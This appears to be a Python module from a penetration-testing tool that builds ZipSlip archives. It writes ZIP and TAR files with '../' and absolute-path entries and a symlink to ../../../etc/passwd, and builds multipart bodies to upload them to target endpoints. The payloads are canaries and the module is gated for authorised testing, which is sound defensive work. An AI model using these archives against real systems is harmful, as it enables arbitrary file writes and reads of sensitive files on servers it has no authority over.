"""ZipSlip / archive traversal testing module.

Features:
  - Generate malicious ZIP/TAR archives with traversal entries
  - Upload to target endpoints and check for write success
  - Symlink-based traversal in TAR archives

Gated behind ``--zipslip`` CLI flag due to active exploitation nature.
"""

from __future__ import annotations

import hashlib
import io
import tarfile
import zipfile
from typing import Dict, List, Optional, Tuple


class ZipSlipTester:
    """Generate and test malicious archives for path traversal."""

    CANARY = "PATHPROBE_ZIPSLIP_CANARY_" + hashlib.md5(b"pathprobe").hexdigest()[:8]

    # ── Archive generation ───────────────────────────────────────────

    def generate_zip(
        self,
        traversal_depth: int = 3,
        target_file: str = "pathprobe_canary.txt",
    ) -> io.BytesIO:
        """Create a ZIP with path-traversal entries.

        Returns an in-memory BytesIO object.
        """
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            # Forward-slash traversal
            zf.writestr("../" * traversal_depth + target_file, self.CANARY)
            # Backslash traversal (Windows)
            zf.writestr("..\\" * traversal_depth + target_file, self.CANARY)
            # Absolute path (Linux)
            zf.writestr("/tmp/" + target_file, self.CANARY)
            # Absolute path (Windows)
            zf.writestr("C:\\Temp\\" + target_file, self.CANARY)
            # Normal entry (control — should always extract safely)
            zf.writestr("normal.txt", "safe_content")
        buf.seek(0)
        return buf

    def generate_tar(
        self,
        traversal_depth: int = 3,
        target_file: str = "pathprobe_canary.txt",
    ) -> io.BytesIO:
        """Create a TAR.GZ with traversal + symlink entries."""
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            # Symlink pointing outside extraction directory
            sym_info = tarfile.TarInfo(name="link_to_etc")
            sym_info.type = tarfile.SYMTYPE
            sym_info.linkname = "../" * traversal_depth + "etc/passwd"
            tf.addfile(sym_info)

            # Regular file with traversal name
            traversal_name = "../" * traversal_depth + target_file
            data = self.CANARY.encode()
            file_info = tarfile.TarInfo(name=traversal_name)
            file_info.size = len(data)
            tf.addfile(file_info, io.BytesIO(data))

            # Normal entry (control)
            normal_data = b"safe_content"
            normal_info = tarfile.TarInfo(name="normal.txt")
            normal_info.size = len(normal_data)
            tf.addfile(normal_info, io.BytesIO(normal_data))
        buf.seek(0)
        return buf

    # ── Upload testing ───────────────────────────────────────────────

    def build_upload_body(
        self,
        archive: io.BytesIO,
        upload_param: str = "file",
        filename: str = "test.zip",
        content_type: str = "application/zip",
    ) -> Tuple[bytes, Dict[str, str]]:
        """Build a multipart/form-data body for uploading the archive.

        Returns ``(body_bytes, headers_dict)``.
        """
        boundary = "----PathProbeZipSlip" + hashlib.md5(
            self.CANARY.encode()
        ).hexdigest()[:12]

        archive.seek(0)
        archive_data = archive.read()

        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{upload_param}"; '
            f'filename="{filename}"\r\n'
            f"Content-Type: {content_type}\r\n"
            f"\r\n"
        ).encode() + archive_data + (
            f"\r\n--{boundary}--\r\n"
        ).encode()

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }
        return body, headers

    def list_archive_entries(self, archive_type: str = "zip") -> List[str]:
        """Return the entry names that would be in a generated archive.

        Useful for documentation/reporting without generating the archive.
        """
        if archive_type == "zip":
            return [
                "../../../pathprobe_canary.txt",
                "..\\..\\..\\pathprobe_canary.txt",
                "/tmp/pathprobe_canary.txt",
                "C:\\Temp\\pathprobe_canary.txt",
                "normal.txt",
            ]
        else:
            return [
                "link_to_etc → ../../../etc/passwd (symlink)",
                "../../../pathprobe_canary.txt",
                "normal.txt",
            ]

    # ── Save to disk ─────────────────────────────────────────────────

    def save_zip(self, path: str, **kwargs) -> str:
        """Generate and save a malicious ZIP to disk."""
        buf = self.generate_zip(**kwargs)
        with open(path, "wb") as f:
            f.write(buf.read())
        return path

    def save_tar(self, path: str, **kwargs) -> str:
        """Generate and save a malicious TAR.GZ to disk."""
        buf = self.generate_tar(**kwargs)
        with open(path, "wb") as f:
            f.write(buf.read())
        return path
